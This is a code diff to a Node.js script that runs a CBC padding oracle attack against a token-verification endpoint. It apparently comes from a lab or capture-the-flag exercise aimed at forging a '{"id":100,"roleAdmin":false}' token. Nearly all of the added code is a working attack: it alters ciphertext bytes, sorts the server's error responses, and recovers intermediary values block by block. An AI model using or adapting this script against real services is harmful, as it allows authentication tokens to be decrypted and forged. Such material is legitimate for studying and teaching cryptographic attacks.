@@ -8,33 +8,9 @@ const ALL_HEX = Array.from(Array(256)).map((v, i) => pad(i.toString(16), 2, 0))
 const BLOCK_SIZE = 16
 const THROTTLE = 100
 
-const MESSAGE_DECRYPT_ERR = 'decrypt err~'
-
-
-/**
- * e.g.:
- * ```
- * xor('2a', '01')
- * // '2b'
- * ```
- *
- */
-function xor (x, y) {
-  return (parseInt(x, 16) ^ parseInt(y, 16)).toString(16)
-}
-
-/**
- * e.g.:
- * ```
- * getIntermediary('2a', '01')
- * // '+'
- * ```
- *
- */
-function getIntermediary (iv, decrypted) {
-  const xor = (x, y) => (parseInt(x, 16) ^ parseInt(y, 16)).toString(16)
-  return Buffer.from(xor(iv, decrypted), 'hex').toString()
-}
+const MESSAGE_DECRYPT_ERROR = 'decrypt err~'
+const MESSAGE_PARSE_ERROR = 'parse json err~'
+const MESSAGE_ORIGINAL = '{"id":100,"roleAdmin":false}'
 
 /**
  * e.g.:
@@ -53,7 +29,7 @@ function replace (buf, pos, hex) {
   if (end > buf.length) {
     throw new Error('The replacement will overflow.')
   }
-  return buf.fill(hex, pos, end, 'hex')
+  return Buffer.from(buf).fill(hex, pos, end, 'hex')
 }
 
 async function verify (token) {
@@ -67,6 +43,10 @@ async function verify (token) {
   return response.body
 }
 
+/**
+ * https://www.freebuf.com/articles/web/15504.html
+ * https://image.3001.net/uploads/image/20131028/20131028140812_51657.png
+ */
 async function findPadding (buf, position) {
   let results = {}
   await pAll(ALL_HEX.map((hex) => async () => {
@@ -89,12 +69,45 @@ async function findPadding (buf, position) {
 async function main () {
   let buf = Buffer.from(TOKEN, 'base64')
   console.log('Buffer: %s\n(Hex: %s)\nLength: %d\nBlock: %d\n(Block size: %d)', buf, buf.toString('hex'), buf.length, buf.length / BLOCK_SIZE, BLOCK_SIZE)
-  const find = async (block, index) => {
+
+  const crackVectorAt = async (buf, block, index) => {
     const position =  BLOCK_SIZE * block + index
     console.log('Original Hex:', buf[position].toString(16))
-    return await findPadding(buf, position)
+    const results = await findPadding(buf, position)
+    let matched
+    if (results[MESSAGE_PARSE_ERROR] && results[MESSAGE_PARSE_ERROR].length === 1) {
+      matched = results[MESSAGE_PARSE_ERROR][0]
+    } else if (results[MESSAGE_ORIGINAL] && results[MESSAGE_ORIGINAL].length === 1) {
+      matched = results[MESSAGE_ORIGINAL][0]
+    } else {
+      throw new Error('Cannot find the replacement hex')
+    }
+    let intermediary = parseInt(matched, 16) ^ (BLOCK_SIZE - index)
+    let iv = intermediary ^ buf[index]
+    return {
+      intermediary,
+      iv,
+    }
   }
-  find(2, 15)
+
+  const crackBlock = async (buf, block) => {
+    let data = {}
+    for (let padding = 1; padding <= BLOCK_SIZE; padding++) {
+      let index = BLOCK_SIZE - padding
+      let b = Buffer.from(buf)
+      for (j = BLOCK_SIZE - 1; j > index; j--) {
+        let hex = (padding ^ data[j].intermediary).toString(16)
+        console.log('REPLACING', j, hex)
+        b = replace(b, j, hex)
+      }
+      data[index] = await crackVectorAt(b, block, index)
+      console.log('DATA', data[index])
+      console.log('FULL DATA', JSON.stringify(data, null, 2))
+    }
+  }
+
+  // await crackVectorAt(buf, 1, 15)
+  await crackBlock(buf, 2)
 
   // await request(TOKEN)
   // let buf = Buffer.from(TOKEN, 'base64')
